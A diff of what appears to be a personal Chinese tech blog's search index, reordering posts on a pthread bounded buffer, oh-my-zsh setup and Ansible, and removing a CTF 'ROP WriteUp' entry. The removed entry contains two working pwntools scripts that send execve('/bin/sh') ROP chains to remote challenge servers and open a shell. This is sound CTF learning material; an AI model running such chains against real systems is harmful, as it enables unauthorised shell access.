@@ -377,7 +377,7 @@
 
 <hr>
 <blockquote>
-<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#115;&#x74;&#x64;&#x6f;&#117;&#x74;&#x40;&#71;&#76;&#x49;&#66;&#67;&#95;&#x32;&#x2e;&#x32;&#x2e;&#x35;" >&#115;&#x74;&#x64;&#x6f;&#117;&#x74;&#x40;&#71;&#76;&#x49;&#66;&#67;&#95;&#x32;&#x2e;&#x32;&#x2e;&#x35; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
+<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#115;&#x74;&#100;&#x6f;&#x75;&#x74;&#64;&#x47;&#x4c;&#73;&#x42;&#x43;&#95;&#x32;&#46;&#50;&#46;&#53;" >&#115;&#x74;&#100;&#x6f;&#x75;&#x74;&#64;&#x47;&#x4c;&#73;&#x42;&#x43;&#95;&#x32;&#46;&#50;&#46;&#53; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
 </blockquote>
 <p><img  
                      lazyload
@@ -405,31 +405,6 @@
 ]]></content>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>OS Bounded Buffer</title>
-    <url>/2024/09/26/os-bbuff/</url>
-    <content><![CDATA[<h2 id="DEF-Functions"><a href="#DEF-Functions" class="headerlink" title="DEF Functions"></a>DEF Functions</h2><ol>
-<li><p>共享記憶體的解決方案 (Share memory Solution)<br> 使用一個共享的Buffer（bounded buffer），這個Buffer有固定大小，生產者將數據放入Buffer，消費者從中取出數據。為了保證生產者和消費者不會同時訪問Buffer，使用互斥鎖 (mutex) 和兩個條件變量 (condition variables)，一個用於通知Buffer未滿 (not full)，另一個用於通知Buffer非空 (not empty)。</p>
-</li>
-<li><p>生產者 (Producer)<br> 生產者的工作是將數據放入Buffer中，當Buffer滿時，它會等待消費者取走一些數據以騰出空間。</p>
-</li>
-<li><p>消費者 (Consumer)<br> 消費者的工作是從Buffer中取出數據，當Buffer為空時，它會等待生產者放入新的數據。</p>
-</li>
-<li><p>Main Funtion</p>
-<ol>
-<li>初始化 mutex</li>
-<li><code>pthread_t prod_thread, cons_thread;</code> 保存新建 Thread ID , 創建生產者跟消費者 Thread</li>
-<li>等待 Thread 完成</li>
-<li>釋放它們佔用的資源 (destory)</li>
-</ol>
-</li>
-</ol>
-<h3 id="IMPL"><a href="#IMPL" class="headerlink" title="IMPL"></a>IMPL</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 5  <span class="comment">// 緩衝區大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];  <span class="comment">// share memory buffer</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;            <span class="comment">// data amount in buffer</span></span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>;               <span class="comment">// producer write position</span></span><br><span class="line"><span class="type">int</span> out = <span class="number">0</span>;              <span class="comment">// consumer read position</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;  <span class="comment">// mutex lock for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_full;  <span class="comment">// not full condition variable for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_empty; <span class="comment">// not empty condition variable for buffer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">producer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        item = rand() % <span class="number">100</span>; <span class="comment">//隨機生成item</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span>(count == BUFFER_SIZE)&#123;</span><br><span class="line">            <span class="comment">//如果緩衝區已滿，等待not_full條件</span></span><br><span class="line">            pthread_cond_wait(&amp;not_full, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// to buffer</span></span><br><span class="line">        buffer[in] = item;</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Producer produced: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// buffer not empty signal</span></span><br><span class="line">        pthread_cond_signal(&amp;not_empty);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line">        sleep(<span class="number">1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// if buffer is empty, wait for not_empty condition</span></span><br><span class="line">            pthread_cond_wait(&amp;not_empty, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// get data from buffer</span></span><br><span class="line">        item = buffer[out];</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count--;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Consumer consumed: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// notify producer buffer not full</span></span><br><span class="line">        pthread_cond_signal(&amp;not_full);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>); <span class="comment">// simulate consumption time</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> producer_thread, consumer_thread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// intialize mutex and condition variables</span></span><br><span class="line">    pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_full, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_empty, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create producer and consumer threads</span></span><br><span class="line">    pthread_create(&amp;producer_thread, <span class="literal">NULL</span>, producer, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;consumer_thread, <span class="literal">NULL</span>, consumer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for threads to finish</span></span><br><span class="line">    pthread_join(producer_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(consumer_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// destroy mutex and condition variables</span></span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    pthread_cond_destroy(&amp;not_full);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <tags>
-        <tag>OS</tag>
       </tags>
   </entry>
   <entry>
@@ -551,6 +526,59 @@
 ]]></content>
       <tags>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>oh-my-zsh p10k</title>
+    <url>/2024/08/11/oh-my-zsh/</url>
+    <content><![CDATA[<h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><p>oh-my-zsh 就是一個可以讓你的zsh變好看的東東，p10k是他的一個theme<br>這篇文章主要講我以為裝完oh-my-zsh後把python-env搞爛，然後找方法變回來的過程</p>
+<p>首先看了<a class="link"   href="https://stackoverflow.com/questions/38928717/virtualenv-name-not-show-in-zsh-prompt" >這篇 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
+<p>試了一下最後重新 <code>python -m venv .venv</code> 就可以了，但還是沒有<code>(.venv)</code>的prompt</p>
+<p>google一下，應該跟這個資料夾有關 <code>.oh-my-zsh/plugins/virtualenv</code>，註解掉裡面的 <code>export VIRTUAL_ENV_DISABLE_PROMPT=1</code></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">~/.zshrc </span><br><span class="line">plugins=(virtualenv)</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></div>
+
+<p>還是沒用，但輸入<code>virtualenv_prompt_info</code>會跳出<code>[.venv]</code>所以開始找把這個函數嵌入prompt的方法</p>
+<p>然後發現是我plugins寫錯了 正確寫法是<code>plugins = (git virtualenv)</code> 把兩個各寫一個plugins，然後就變成這樣了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/zsh-bug-1.png"
+                      alt="image"
+                ></p>
+<p>有點破爛啊<br>解決方法 -&gt; 修改 .p10k.zsh</p>
+<h2 id="p10k-zsh"><a href="#p10k-zsh" class="headerlink" title="p10k.zsh"></a>p10k.zsh</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">typeset</span> -g POWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(</span><br><span class="line">  <span class="comment"># =========================[ Line #1 ]=========================</span></span><br><span class="line">  os_icon               <span class="comment"># os identifier</span></span><br><span class="line">  <span class="built_in">dir</span>                     <span class="comment"># current directory</span></span><br><span class="line">  vcs                     <span class="comment"># git status</span></span><br><span class="line">  <span class="comment"># =========================[ Line #2 ]=========================</span></span><br><span class="line">  newline                 <span class="comment"># \n</span></span><br><span class="line">  <span class="comment"># prompt_char           # prompt symbol</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
+
+<p>然後發現本來就有pyenv的資訊了，就寫在後面的小框框 :&gt;<br>發現時間 4:00 AM，有時候都覺得我根本沒腦</p>
+<p>三小時學會改zsh :&gt;&gt;&gt;</p>
+<h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p>zsh p10k可以看<a class="link"   href="https://onejar99.com/zsh-powerlevel10k-custom-config-note/" >這篇 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <tags>
+        <tag>zsh</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OS Bounded Buffer</title>
+    <url>/2024/09/26/os-bbuff/</url>
+    <content><![CDATA[<h2 id="DEF-Functions"><a href="#DEF-Functions" class="headerlink" title="DEF Functions"></a>DEF Functions</h2><ol>
+<li><p>共享記憶體的解決方案 (Share memory Solution)<br> 使用一個共享的Buffer（bounded buffer），這個Buffer有固定大小，生產者將數據放入Buffer，消費者從中取出數據。為了保證生產者和消費者不會同時訪問Buffer，使用互斥鎖 (mutex) 和兩個條件變量 (condition variables)，一個用於通知Buffer未滿 (not full)，另一個用於通知Buffer非空 (not empty)。</p>
+</li>
+<li><p>生產者 (Producer)<br> 生產者的工作是將數據放入Buffer中，當Buffer滿時，它會等待消費者取走一些數據以騰出空間。</p>
+</li>
+<li><p>消費者 (Consumer)<br> 消費者的工作是從Buffer中取出數據，當Buffer為空時，它會等待生產者放入新的數據。</p>
+</li>
+<li><p>Main Funtion</p>
+<ol>
+<li>初始化 mutex</li>
+<li><code>prod_thread, cons_thread</code> 保存新建 Thread ID , 創建生產者跟消費者 Thread</li>
+<li>等待 Thread 完成</li>
+<li>釋放它們佔用的資源 (destory)</li>
+</ol>
+</li>
+</ol>
+<h3 id="IMPL"><a href="#IMPL" class="headerlink" title="IMPL"></a>IMPL</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 5  <span class="comment">// 緩衝區大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];  <span class="comment">// share memory buffer</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;            <span class="comment">// data amount in buffer</span></span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>;               <span class="comment">// producer write position</span></span><br><span class="line"><span class="type">int</span> out = <span class="number">0</span>;              <span class="comment">// consumer read position</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;  <span class="comment">// mutex lock for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_full;  <span class="comment">// not full condition variable for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_empty; <span class="comment">// not empty condition variable for buffer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">producer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        item = rand() % <span class="number">100</span>; <span class="comment">//隨機生成item</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span>(count == BUFFER_SIZE)&#123;</span><br><span class="line">            <span class="comment">//如果緩衝區已滿，等待not_full條件</span></span><br><span class="line">            pthread_cond_wait(&amp;not_full, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// to buffer</span></span><br><span class="line">        buffer[in] = item;</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Producer produced: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// buffer not empty signal</span></span><br><span class="line">        pthread_cond_signal(&amp;not_empty);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line">        sleep(<span class="number">1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// if buffer is empty, wait for not_empty condition</span></span><br><span class="line">            pthread_cond_wait(&amp;not_empty, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// get data from buffer</span></span><br><span class="line">        item = buffer[out];</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count--;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Consumer consumed: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// notify producer buffer not full</span></span><br><span class="line">        pthread_cond_signal(&amp;not_full);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>); <span class="comment">// simulate consumption time</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> producer_thread, consumer_thread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// intialize mutex and condition variables</span></span><br><span class="line">    pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_full, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_empty, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create producer and consumer threads</span></span><br><span class="line">    pthread_create(&amp;producer_thread, <span class="literal">NULL</span>, producer, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;consumer_thread, <span class="literal">NULL</span>, consumer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for threads to finish</span></span><br><span class="line">    pthread_join(producer_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(consumer_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// destroy mutex and condition variables</span></span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    pthread_cond_destroy(&amp;not_full);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <tags>
+        <tag>OS</tag>
       </tags>
   </entry>
   <entry>
@@ -1262,24 +1290,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ROP WriteUp</title>
-    <url>/2024/08/09/pwn-4/</url>
-    <content><![CDATA[<h3 id="Ais3-lys-rop1"><a href="#Ais3-lys-rop1" class="headerlink" title="Ais3-lys-rop1"></a>Ais3-lys-rop1</h3><blockquote>
-<p>當有NX保護機制時，ROP可以幫助我們繞過他</p>
-</blockquote>
-<p>找gadget把rop chain推成shellcode的形狀</p>
-<br>
-
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;35.229.243.81&quot;</span> ,<span class="number">10101</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;rop1&quot;)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;name?&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401f4f</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x0000000000485bab</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000044fd87</span></span><br><span class="line">pop_rax = <span class="number">0x000000000044fd87</span></span><br><span class="line">syscall  =<span class="number">0x0000000000401d04</span></span><br><span class="line">a_buf = <span class="number">0x4c7300</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line"><span class="comment"># p+= p64(pop_rax)+p64(59)</span></span><br><span class="line"><span class="comment"># p+= p64(pop_rsi)+p64(0x0)</span></span><br><span class="line"><span class="comment"># p+= p64(pop_rdi) + p64(a_buf)</span></span><br><span class="line"><span class="comment"># p += p64(pop_rdx_rbx)+p64(0x0)+p64(0x0)</span></span><br><span class="line"><span class="comment"># p += p64(syscall)</span></span><br><span class="line"></span><br><span class="line">p +=flat(</span><br><span class="line">    p64(pop_rax), p64(<span class="number">59</span>),</span><br><span class="line">    p64(pop_rsi) , p64(<span class="number">0x0</span>),</span><br><span class="line">    p64(pop_rdi) , p64(a_buf),</span><br><span class="line">    p64(pop_rdx_rbx),p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>),</span><br><span class="line">    p64(syscall)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;vuln:&quot;</span>,p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="ncku-ctf-ezrop"><a href="#ncku-ctf-ezrop" class="headerlink" title="ncku-ctf-ezrop"></a>ncku-ctf-ezrop</h2><p>這題跟上面差在需要找到一個位置寫入<code>/bin/sh</code>在把rdi指過去，像上面我們把rdi指向name的memory address。<br>這邊我們利用 <code>mov qword ptr [rdi], rdx ; ret</code> 把rdx設為<code>/bin/sh</code>後丟到rdi指向的位置。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./rop&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.nckuctf.org&quot;</span>,<span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401e9f</span></span><br><span class="line">pop_rax = <span class="number">0x44fd07</span></span><br><span class="line">pop_rsi = <span class="number">0x409f0e</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x485a8b</span> </span><br><span class="line">syscall = <span class="number">0x401c54</span></span><br><span class="line">bss = <span class="number">0x4c5000</span></span><br><span class="line"></span><br><span class="line">mov_rdi_rdx = <span class="number">0x433463</span> <span class="comment">#  mov qword ptr [rdi], rdx ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="number">0x0</span>,</span><br><span class="line">    mov_rdi_rdx,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;/home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Stack Pivoting WriteUp</title>
     <url>/2024/08/09/pwn-5/</url>
     <content><![CDATA[<h2 id="Stack-Pivoting"><a href="#Stack-Pivoting" class="headerlink" title="Stack Pivoting"></a>Stack Pivoting</h2><blockquote>
@@ -1351,210 +1361,6 @@
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NTTU 伺服器原理 WriteUp-2</title>
-    <url>/2024/08/09/server-1/</url>
-    <content><![CDATA[<h2 id="Ansible"><a href="#Ansible" class="headerlink" title="Ansible"></a>Ansible</h2><h3 id="Docs"><a href="#Docs" class="headerlink" title="Docs"></a>Docs</h3><ul>
-<li><code>$ansible-navigator doc -l</code></li>
-<li><code>ansible-navigator doc &lt;ansible.builtin.dnf&gt;</code></li>
-</ul>
-<p><a class="link"   href="https://docs.ansible.com/" >Official <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/By-XF2wX6.png"
-                      alt="image.png"
-                ></p>
-<h3 id="Yaml"><a href="#Yaml" class="headerlink" title="Yaml"></a>Yaml</h3><p><a href="/4KwXbbiGQd2tMdJVML-zxA">Re</a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/H1MBF2vQT.png"
-                      alt="image.png"
-                ></p>
-<h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><h4 id="名詞解釋"><a href="#名詞解釋" class="headerlink" title="名詞解釋"></a>名詞解釋</h4><ul>
-<li>inventory<ul>
-<li>host</li>
-<li>group</li>
-</ul>
-</li>
-<li>playbook<ul>
-<li>play</li>
-<li>task<ul>
-<li>modules</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Requirement"><a href="#Requirement" class="headerlink" title="Requirement"></a>Requirement</h4><p>Linux , macos ,unix like host: <strong>need &gt;python3.5</strong></p>
-<h4 id="Inventory"><a href="#Inventory" class="headerlink" title="Inventory"></a>Inventory</h4><ul>
-<li>定義清單</li>
-</ul>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cd</span> /etc/ansible</span><br><span class="line"><span class="variable">$vim</span> hosts</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>INI or YAML</p>
-</blockquote>
-<ul>
-<li>群組</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.com</span><br><span class="line">serverb.lab.example.com</span><br><span class="line">(server count)&gt;=0</span><br><span class="line">[web_server]</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>巢狀群組</li>
-</ul>
-<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[usa]</span><br><span class="line">washington1.example.<span class="keyword">com</span></span><br><span class="line">washington2.example.<span class="keyword">com</span></span><br><span class="line">[canada]</span><br><span class="line">ontario01.example.<span class="keyword">com</span></span><br><span class="line">ontario02.example.<span class="keyword">com</span></span><br><span class="line">[north-americ<span class="variable">a:children</span>]</span><br><span class="line">canada</span><br><span class="line">usa</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="ansible-cfg"><a href="#ansible-cfg" class="headerlink" title="ansible.cfg"></a>ansible.cfg</h4><ul>
-<li><code>$vim ansible.cfg</code></li>
-</ul>
-<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory = ./inventory</span><br><span class="line">remote user = devops</span><br><span class="line">ask_pass = false</span><br><span class="line"># $ssh-keygen</span><br><span class="line"># $ssh-<span class="keyword">copy</span>-id</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become = true</span><br><span class="line">become method = sudo</span><br><span class="line">become_user = root</span><br><span class="line">become_ask_pass = true</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>Show inventory</li>
-</ul>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cp</span> /etc/ansible/hosts inventory</span><br><span class="line"><span class="variable">$ansible</span>-navigator inventory -m stdout &lt;--list or --graph&gt;</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="Playbook-yml"><a href="#Playbook-yml" class="headerlink" title="Playbook.yml"></a>Playbook.yml</h4><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Adduser</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">username</span> <span class="string">is</span> <span class="string">chih</span> </span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">chih</span> </span><br><span class="line">        <span class="attr">uid:</span> <span class="number">8888</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br></pre></td></tr></table></figure></div>
-
